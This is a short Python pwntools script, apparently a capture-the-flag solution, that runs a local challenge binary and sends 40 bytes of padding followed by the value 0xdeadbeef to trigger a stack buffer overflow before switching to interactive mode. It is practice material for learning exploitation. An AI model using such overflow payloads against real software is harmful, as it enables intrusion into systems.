#! /usr/bin/python3

from pwn import *

HOST = ''
PORT = ''

p = process('./chall')

p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xef\xbe\xad\xde')

p.interactive()
